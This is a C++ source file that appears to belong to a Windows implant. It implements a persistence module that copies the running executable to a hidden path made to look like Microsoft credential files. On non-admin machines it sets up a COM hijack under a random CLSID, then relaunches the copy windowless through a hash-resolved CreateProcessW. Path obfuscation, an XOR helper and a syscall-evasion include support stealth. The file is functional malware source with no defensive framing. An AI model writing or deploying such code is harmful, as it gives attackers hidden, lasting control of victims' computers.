#include "Persistence.h"
#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <string>
#include <vector>
#include <random>
#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")

namespace persistence {

namespace {
// XOR helper
std::string xorDecrypt(const std::string& enc, BYTE key) {
    std::string dec = enc;
    for (char& c : dec) c ^= key;
    return dec;
}

}

namespace {

bool isAdmin() {
    BOOL is_admin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &is_admin);
        FreeSid(AdministratorsGroup);
    }
    return is_admin == TRUE;
}

std::wstring getExecutablePath() {
    std::vector<wchar_t> path_buf;
    DWORD copied = 0;
    do {
        path_buf.resize(path_buf.size() + MAX_PATH);
        copied = GetModuleFileNameW(NULL, path_buf.data(), static_cast<DWORD>(path_buf.size()));
    } while (copied >= path_buf.size());
    path_buf.resize(copied);
    return std::wstring(path_buf.begin(), path_buf.end());
}

std::wstring getPersistencePath() {
    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
    wchar_t expanded[MAX_PATH];
    ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
    std::wstring userPersistPath = expanded;
    std::wstring fileName = L"\\auth.dll";
    return userPersistPath + fileName;
}

} // namespace
bool isRunningFromPersistence() {
    std::wstring sourcePath = getExecutablePath();
    std::wstring persistPath = getPersistencePath();
    return lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0;
}
void establishPersistence() {
    std::wstring sourcePath = getExecutablePath();
    std::wstring persistPath = getPersistencePath();

    if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
        return; // Already running from persistence location
    }

    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
    wchar_t expanded[MAX_PATH];
    ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
    CreateDirectoryW(expanded, NULL);
    CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);

    if (!isAdmin()) {
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), NULL, 0, NULL, NULL);
        std::string implantPath(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), &implantPath[0], size_needed, NULL, NULL);

        GUID guid;
        CoCreateGuid(&guid);
        wchar_t guid_w[40];
        StringFromGUID2(guid, guid_w, 40);
        std::wstring clsid_w(guid_w);

        int clsid_size_needed = WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), NULL, 0, NULL, NULL);
        std::string clsid(clsid_size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), &clsid[0], clsid_size_needed, NULL, NULL);

        persistence::ComHijacker::Install(implantPath, clsid);
    }

    // Launch the newly persisted executable
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    using CreateProc = BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    DWORD hash = djb2Hash("CreateProcessW");
    CreateProc pCreate = (CreateProc)getProcByHash(hKernel, hash);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    pCreate(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

} // namespace persistence
